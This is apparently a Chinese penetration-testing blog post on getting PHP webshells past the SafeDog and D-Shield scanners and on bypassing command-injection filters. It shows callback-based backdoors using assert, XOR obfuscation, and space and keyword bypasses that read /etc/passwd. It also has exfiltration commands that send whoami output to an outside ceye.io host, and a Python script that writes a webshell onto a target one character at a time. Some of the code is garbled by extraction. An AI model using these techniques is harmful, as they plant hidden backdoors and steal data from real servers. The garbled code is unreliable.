安全狗 | D盾  
---|---  
1 个安全风险 php后门回调木马 | 级别 5 已知后门  
**registregister_shutdown_function()**
    register_shutdown_function ( callable $callback [, mixed $... ] ) : void
注册一个 `callback` ，它会在脚本执行完成或者
[exit()](https://www.php.net/manual/zh/function.exit.php) 后被调用。
安全狗 | D盾  
---|---  
1 个安全风险 php后门回调木马 | 级别 5 已知后门  
**register_tick_function()**
    register_tick_function ( callable $function [, mixed $arg [, mixed $... ]] ) : bool
注册在调用记号时要执行的给定函数。
        #上面程序中“declare(ticks=1);”代表，每执行一条低级语句，就触发register_tick_function中注册的函数
安全狗 | D盾  
---|---  
1 个安全风险 php后门回调木马 | 级别 5 已知后门  
**filter_var()**
    filter_var(variable, filter, options)
filter_var() 函数通过指定的过滤器过滤变量。
参数 | 描述  
---|---  
variable | 必需。规定要过滤的变量。  
filter | 可选。规定要使用的过滤器的 ID。  
options | 规定包含标志/选项的数组。检查每个过滤器可能的标志和选项。  
     'assert'));
    ?>
安全狗 | D盾  
---|---  
1 个安全风险 php后门回调木马 | 级别 5 已知后门  
**filter_var_array()**
    filter_var_array(array, args)
filter_var_array() 函数获取多项变量，并进行过滤。
参数 | 描述  
---|---  
array | 必需。规定带有字符串键的数组，包含要过滤的数据。  
args | 可选。规定过滤器参数数组。合法的数组键是变量名。合法的值是过滤器 ID，或者规定过滤器、标志以及选项的数组。该参数也可以是一个单独的过滤器
ID，如果是这样，输入数组中的所有值由指定过滤器进行过滤。  
     $_REQUEST['x']), array('test' => array('filter' => FILTER_CALLBACK, 'options' => 'assert')));
    ?>
安全狗 | D盾  
---|---  
0级 | 级别 5 已知后门  
## 异或
P 神的文章 [一些不包含数字和字母的webshell](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html#) 里面提到了三种异或的姿势；但目前只有第一种方法可以过狗
所以只重点来看一下第一种姿势，也就是异或
国光师傅写好了一个脚本，除了字母以外的ASCII字符任意异或，能得到字母的就输出
    import string 
    from urllib.parse import quote
    keys = list(range(65)) + list(range(91,97)) + list(range(123,127)) 
    results = [] 
    for i in keys: 
        for j in keys: 
            asscii_number = i^j 
            if (asscii_number >= 65 and asscii_number = 97 and asscii_number =32: 
                    temp = (f'{chr(asscii_number)} = ascii:{i} ^ {chr(j)} = {quote(chr(i))} ^ {quote(chr(j))}', chr(asscii_number)) 
                    results.append(temp) 
                elif i >= 32 and j  Result.txt
根据这个受了启发，GitHub上写了个混淆脚本
## PHP7免杀脚本制作
eval和assert都变成了语言结构，无法成为可变函数了….所以PHP7开始免杀资料就销声匿迹了-=-
故而PHP7常用的技术重点不在隐藏函数名（也没必要，已经藏不了了）
PHP7支持`(可变函数名)(参数)`这样的用法
我已经自写了个工具，项目见[GitHub](https://github.com/Great-Wan/WebShell_Confuse_and_Command_Split)
## 命令执行绕过
Linux下一些命令操作符的科普
>   1. cmd1 | cmd2 (|管道操作符)将cmd1的结果输出给cmd2
>   2. cmd1 & cmd2 (&和号操作符)让命令在后台运行
>   3. cmd1 ; cmd2 (; 分号操作符)执行多条命令
>   4. cmd1 && cmd2 (&& 与操作符)只有cmd1命令执行成功后，才会执行cmd2
>   5. cmd1 || cmd2 (|| 或操作符)cmd1执行失败，才会执行cmd2
>
### **空格绕过**
**字符串拼接**
IFS(内部域分隔)，是Shell的内置变量，是一个用于分割字段的字符列表，默认值是空白(包括空格、tab、换行)
可以有以下变形:
    cat$IFS$数字a.txtcat${IFS}a.txtcat$IFS'a.txt'
**使用{}**
    例如{cat,a.txt}
**使用Tab，PHP环境下可用**
    cat%09/etc/passwd
**在读取文件的时候利用重定向符 <>**
    cat<>text cat t a.txtHello!wzf@wzf-virtual-machine:~$ ca\t a.txtHello!
**Base64编码**
    wzf@wzf-virtual-machine:~$ echo at | base64YXQKwzf@wzf-virtual-machine:~$ c$(echo YXQK | base64 -d) a.txtHello!
**其他占位符**
其实核心都是为了占个位置罢了,下面这些都行的
    wzf@wzf-virtual-machine:~$ c`echo a`t a.txtHello!wzf@wzf-virtual-machine:~$ c``at a.txtHello!wzf@wzf-virtual-machine:~$ c''at a.txtHello!wzf@wzf-virtual-machine:~$ c""at a.txt Hello!wzf@wzf-virtual-machine:~$ c$(echo '')at a.txtHello!wzf@wzf-virtual-machine:~$ c`echo a`t a.txtHello!
###  无回显绕过
其实都大同小异，使用dnslog、ceye这类的外带网站或者BP Collaborator进行外带操作
dnslog适合一次性使用，无须注册；Ceye适合多次使用，需要注册。都是免费的~
PS:ceye是真的慢啊=.=
**使用HTTP协议**
    curl 34kk35.ceye.io/`whoami`
或者加上编码也可
    curl 34kk35.ceye.io/$(whoami | base64)
**使用DNS**
    dig `whoami`.34kk35.ceye.io
###  后续用到的马
如果没有特殊指出，基本上用到的马都是这个哦
###  拆分
其实一开始的想法就是把命令拆分然后发出去…顺带还能过WAF，所以一时兴起写了它
Linux下很简单就不写了，重点写个Windows；有一些DOS语法糖~看不懂的可以私信
    #Windows下写马脚本，用以命令拆分~import requestsfrom loguru import loggersession=requests.Session()command=f''blacklist=['','>>','@','[',']',';',':','(',')','$','&','|','&&','||','+','-','~','*','/','?']def run(chuan):  url = "http://192.168.85.142:80/"  headers = {    "Pragma": "no-cache",        "Cache-Control": "no-cache",     "Upgrade-Insecure-Requests": "1",     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",     "Content-Type": "application/x-www-form-urlencoded",     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",     "Accept-Encoding": "gzip, deflate",    "Accept-Language": "zh-CN,zh;q=0.9",     "Connection": "close"    }  data = {"cmd": chuan}  try:    res=session.post(url, headers=headers, data=data)    print(res.text)  except Exception as e:    logger.exception(e)def judge(c):    if c in blacklist:      run(f'set /p=^{c}>1')    else:      run(f'set /p={c}>1')for i in range(0,len(command)):  if i+1 != len(command) and command[i+1] == ' ':    judge(command[i]+command[i+1])  elif command[i] != ' ':    judge(command[i])  else:    continue
这样就能成功写进去了
当然，还是有几个缺点的：
  1. 由于命令行里面0~9单个数字是有特殊用处的，所以不能出现单个数字（两位及以上就正常了）
  2. 因为得按序写，无法使用多线程-=-如果命令相当长+网络环境不好得蛮久
  3. 黑名单是自己想了一些DOS特殊符号，并不是很全；大家有补充可以填进去
###  拆分思路扩展
**一个CTF题学习代码执行拆分**
比如有以下限制
**长度要求小于17**
可以这么嵌套用，刚好cmd的长度为16
按道理这里不需要eval，但是不加eval并不会执行…调试也没发现为什么
    cmd=eval($_POST[1]);&1=system('dir c:\*');
**长度要求小于15**
可以直接改成GET方式
或者可以采取其他方式：如果是Linux下需要执行 echo \>1
    echo \1echo eval\(>>1echo \$_GET>>1echo \[1\]>>1echo \)\;?>>1
**时间倒序写入**
通过
     >命令内容\\
来写入空文件，再将空文件目录按照时间顺序进行排列；再写入到命令集合文件a中
最后利用`sh a` 来执行a文件中的命令，来突破长度限制
有几个注意事项：
  * .为linux隐藏文件，不能作为文件开头
  * 我们需要按照时间顺序来排序最后的结果，ls默认以字母排序
我已经写好了一个脚本，放在了Github上~
可以用它自动化完成这一操作
## 参考链接
[独特的免杀思路](http://uuzdaisuki.com/2021/05/11/webshell%E5%85%8D%E6%9D%80%E7%A0%94%E7%A9%B6php%E7%AF%87/)
[PHP7后的免杀思路](https://www.anquanke.com/post/id/193787)
[较全的PHP5、PHP7免杀浅谈](https://www.freebuf.com/articles/network/279563.html)
[国光的PHPWebshell免杀总结](https://www.sqlsec.com/2020/07/shell.html#toc-heading-24)
[Windows与Linux的Apache安装](https://cloud.tencent.com/developer/article/1698069)
[P神的无字母数字WebShell](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html?page=1#reply-list)
[P神的无字母数字Webshell续](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html?page=1#reply-list)
[绕过小结](https://www.mi1k7ea.com/2019/06/30/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5Bypass%E6%8A%80%E5%B7%A7%E5%B0%8F%E7%BB%93/#0x01-%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4Bypass)
[命令注入长度绕过CTF题](https://www.cnblogs.com/-chenxs/p/11981586.html)
[命令注入小结](https://www.mi1k7ea.com/2019/06/30/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5Bypass%E6%8A%80%E5%B7%A7%E5%B0%8F%E7%BB%93/)
还有一些博客在查阅资料时疏于记录，但同样给予了重大改进；在此表达真挚的感谢！